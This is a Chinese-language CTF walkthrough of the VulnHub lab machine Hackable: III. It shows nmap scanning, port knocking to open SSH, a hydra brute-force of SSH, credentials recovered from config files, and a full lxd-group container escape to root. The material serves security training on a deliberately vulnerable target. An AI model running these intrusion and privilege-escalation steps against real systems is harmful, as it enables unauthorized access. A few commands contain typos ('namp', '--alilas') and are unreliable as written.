lxd提权, port knocking, vulnhub, 综合

该靶机难度中等。

1. 靶机信息

靶机地址：

  • Hackable: III ~ VulnHub

目标：

  • 拿到root权限
  • 拿到2个flag

难度：

  • 中等

2. 信息收集

2.1. 端口信息

1. sudo arp-scan -l
2. sudo nmap -p- 10.0.2.55
3. sudo nmap -p22,80 -A 10.0.2.55

注意这里的22端口的状态为 filtered，可能是存在端口敲门[[Port Knocking]]，所以等会需要留一下是否存在端口序列号。

2.2. http服务

直接访问80端口，主页面就一张图片，没有其他信息

查看源码得到一行注释： 

"Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com"

这么一句话其实有许多信息：

  1. 可能存在着三个用户：jubiscleudo, boss, dev_suport
  2. 确实存在 port knocking
  3. 某个图片文件
  4. 一个域名：hackable3.com

不管如何，先将该域名加入 /etc/hosts。之前路径扫描IP得到许多文件

一一访问这些文件。

从 /backup 目录中得到一个 wordlist.txt。

从 /config 目录中得到一个文件 1.txt，内容为 MTAwMDA=，利用base64解码得到 10000。

从 config.php 中得到如下内容：

3. get shell

从上面的信息收集可以知道，22端口存在port knocking，并且也获得了一个端口序列号：10000, 4444, 65535。于是先后访问这三个端口，然后再次查看22端口的状态： 

1. nmap -p 10000 10.0.2.55
2. nmap -p 4444 10.0.2.55
3. namp -p 65535 10.0.2.55

但是22还是处于filtered状态

后来搜索发现，需要使用 knock 这个工具 

knock 10.0.2.55 10000 4444 65535

22 端口成功开放。然后利用刚刚获得的用户名：jubiscleudo，以及wordlist.txt进行爆破 

hydra -l jubiscleudo -P wordlist.txt 10.0.2.55 ssh

jubiscleudo:onlymy

利用得到的用户名和密码ssh登录

4. 权限提升

在 /var/www/html 下发现了一个文件 .bacup_config.php 内容如下： 

<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'hackable_3');
define('DB_PASSWORD', 'TrOLLED_3');
define('DB_NAME', 'hackable');
 
/* Attempt to connect to MySQL database */
$conexao = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);


// Check connection
if($conexao === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
} else {
}
?>

尝试使用如下命令连接数据库，发现靶机上没有数据库 

mysql -u hackable_3 -p

注意到 /etc/passwd 中有一个用户为: hackable_3，切换到该用户，查看用户id

注意最后的 lxd，即hackable_3用户是 lxd 组的用户，而lxd组用户是可以提权到root的。

需要分为两大部分：

  1. 攻击者需要做的
  2. 靶机需要做的

攻击者需要在kali上执行如下命令： 

1. git clone https://github.com/saghul/lxd-alpine-builder.git
2. cd lxd-alpine-builder
3. ./build-alpine # 以root权限

然后将该shell放在一旁。执行完最后一条命令之后，会在该目录下生成一个 tar.gz 的文件，将其发送到靶机。

靶机上需要执行下面命令： 

1. lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alilas shell
2. lxc image list # 查看是否导入
3. lxd init # 然后一直回车就好
4. lxc init shell ignite -c security.privileged=true
5. lxc config device add ignite mydevice disk source=/ path=/mnt/root # 配置容器，将宿主机根目录挂载到容器/mnt/root目录下。
6. lxc start ignite
7. lxc exec ignite /bin/sh
8. chroot /mnt/root

成功拿到root权限。
